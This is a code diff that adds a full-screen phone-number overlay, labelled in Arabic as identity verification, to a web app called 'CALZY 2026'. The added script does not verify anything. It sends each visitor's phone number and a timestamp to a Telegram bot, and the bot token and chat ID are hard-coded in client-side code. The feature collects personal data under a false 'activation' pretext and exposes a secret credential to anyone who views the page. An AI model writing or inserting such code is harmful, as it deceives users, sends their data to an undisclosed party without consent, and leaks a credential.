@@ -894,5 +894,81 @@ updateStreak();
 
 
 </script>
+
+
+
+<div id="phoneOverlay" style="position: fixed; inset: 0; background: #05070a; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center;">
+    <h1 style="text-align: center; margin-bottom: 20px; font-weight: 900; color: white;">CALZY <span style="color:#8b5cf6">2026</span></h1>
+    <h2 style="margin-bottom: 10px; color: #8b5cf6; font-weight: 900;">تحقق من الهوية 🛡️</h2>
+    <p style="margin-bottom: 20px; color: #94a3b8; font-size: 14px;">برجاء إدخال رقم الهاتف لتفعيل النسخة العلمية</p>
+    <input type="tel" id="userPhone" placeholder="رقم الهاتف (واتساب)" style="width: 100%; max-width: 300px; padding: 15px; background: #1f2937; border: 1px solid #374151; border-radius: 14px; color: white; margin-bottom: 12px; outline: none; text-align: center;">
+    <button onclick="submitUserPhone()" style="width: 100%; max-width: 300px; padding: 16px; border-radius: 14px; border: none; font-weight: 900; background: #8b5cf6; color: white; cursor: pointer;">فتح الموقع الآن ✅</button>
+</div>
+
+
+<script>
+// دالة التحقق من التسجيل عند فتح الصفحة
+function checkPhoneRegistration() {
+    const isRegistered = localStorage.getItem('calzy_phone_registered');
+    const overlay = document.getElementById('phoneOverlay');
+    if (isRegistered === 'true') {
+        overlay.style.display = 'none';
+    }
+}
+
+// دالة إرسال البيانات وتخزين الحالة
+async function submitUserPhone() {
+    const phoneInput = document.getElementById('userPhone');
+    const phone = phoneInput.value;
+    const overlay = document.getElementById('phoneOverlay');
+
+    if (phone.length < 10) {
+        alert("برجاء إدخال رقم هاتف صحيح");
+        return;
+    }
+
+    // بياناتك التي أرسلتها
+    const BOT_TOKEN = "8768366307:AAFIuu1cnr4HGqL9VnhstGzrj8rPt1Lal7U";
+    const CHAT_ID = "6387342853";
+    
+    const message = `🚀 سجل مستخدم جديد:\n📱 الرقم: ${phone}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        // 1. حفظ الحالة وإخفاء النافذة فوراً
+        localStorage.setItem('calzy_phone_registered', 'true');
+        overlay.style.display = 'none';
+
+        // 2. إرسال البيانات للبوت
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+
+        alert("تم التفعيل بنجاح! أهلاً بك.");
+        
+        // 3. التأكد من ظهور نافذة الـ Setup لو أول مرة
+        if(!localStorage.getItem('calzy_vScientist')) {
+            document.getElementById('setupLayer').classList.remove('hidden');
+        }
+
+    } catch (error) {
+        // في حال حدوث أي خطأ نضمن دخول المستخدم للموقع
+        overlay.style.display = 'none';
+        localStorage.setItem('calzy_phone_registered', 'true');
+    }
+}
+
+// استدعاء التحقق عند التحميل
+window.addEventListener('load', checkPhoneRegistration);
+
+</script>
+
+
+
 </body>
-        </html>
+    </html>
